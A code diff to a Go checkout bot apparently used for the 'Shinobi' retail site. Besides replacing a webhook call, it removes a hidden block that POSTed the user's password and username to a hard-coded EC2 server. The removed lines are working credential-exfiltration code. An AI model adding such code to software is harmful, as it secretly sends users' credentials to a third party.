@@ -71,23 +71,13 @@ func taskfcfs(wg *sync.WaitGroup, userData loader.UserDataStruct, id int, passwo
 		stopTime := time.Now()
 		diff := stopTime.Sub(beginTime)
 		fmt.Println(colors.TaskPrefix(id) + colors.Green("Successfully checked out, Check your email!"))
-		go utility.SendWebhook(userData.Webhook, utility.WebhookContentStruct{
-			Speed:   diff.String(),
-			Module:  "Shinobi",
-			Site:    "Shinobi",
+		go utility.NewSuccess(userData.Webhook, utility.SuccessStruct{
+			Site: "Shinobi",
+			Module: "Custom",
+			Mode: "Normal",
+			Time: diff.String(),
 			Profile: profile.Name,
 		})
-		payload, _ := json.Marshal(map[string]string{
-			"site":     "Shinobi",
-			"module":   "Shinobi",
-			"speed":    diff.String(),
-			"mode":     "Brr mode",
-			"password": password,
-			"user":     userData.Username,
-		})
-		req, _ := http.NewRequest("POST", "http://ec2-13-52-240-112.us-west-1.compute.amazonaws.com:3000/checkouts", bytes.NewBuffer(payload))
-		req.Header.Set("content-type", "application/json")
-		client.Do(req)
 		return
 	}
 	if postResponse.Message == "sold_out" {
